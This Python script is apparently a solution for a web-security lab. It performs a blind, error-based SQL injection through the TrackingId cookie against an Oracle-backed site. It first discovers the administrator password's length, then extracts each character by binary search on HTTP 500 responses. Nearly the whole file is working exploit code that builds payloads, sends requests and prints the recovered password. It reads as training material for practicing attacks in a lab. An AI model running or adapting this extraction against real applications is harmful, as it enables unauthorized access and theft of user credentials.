import string
import requests
import argparse
import sys

from blind_sqli import Database
from blind_sqli import create_conditional_error_sqli as make_sqli
from utils import binary_search_with_predicate as bsearch

CHARSET = "".join(sorted(
    string.digits + string.ascii_uppercase + string.ascii_lowercase))

SQLi = {
    "password_length" : make_sqli(
        sql_condition="username='administrator' and length(password) > {}",
        database=Database.ORACLE,
        from_table="users"),
    
    "password_chars" : make_sqli(
        sql_condition="username='administrator' and '{}' >= substr(password, {}, 1)",
        database=Database.ORACLE,
        from_table="users")
}

URL = ""

def discover_password_length():
    length = 1
    while True:
        response = requests.get(URL, headers = {
            "Cookie": "TrackingId={}"
                .format(SQLi.get("password_length"))
                .format(length)
        })

        if response.status_code == 404:
            print("Session expired. Restart the lab.")
            sys.exit()

        if not response.status_code == 500:
            print("Length of password is: {}".format(length))
            break

        length += 1   
    return length

def discover_password_bsearch(password_length=0):
    
    def bsearch_predicate(index, position):
        response = requests.get(URL, headers={
            "Cookie" : "TrackingId={}"
                .format(SQLi.get("password_chars"))
                .format(CHARSET[index], position)
        })        
        return response.status_code == 500

    if password_length == 0:
        print("Length of password not specified. Discovering...")
        password_length = discover_password_length()

    print("Performing binary search to discover password...")
    
    position = 1
    iterations = 0
    result = ""
    bounds = (0, len(CHARSET) - 1)

    while position <= password_length:        
        index, iters = bsearch(bounds, bsearch_predicate, position)
        character = CHARSET[index]
        print("Found character {} at position {}".format(character, position))
        result += character
        iterations += iters
        position += 1        

    print("Found password {} after {} iterations.".format(result, iterations))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the URL for the lab")
    args = parser.parse_args()

    URL = args.url
    discover_password_bsearch()
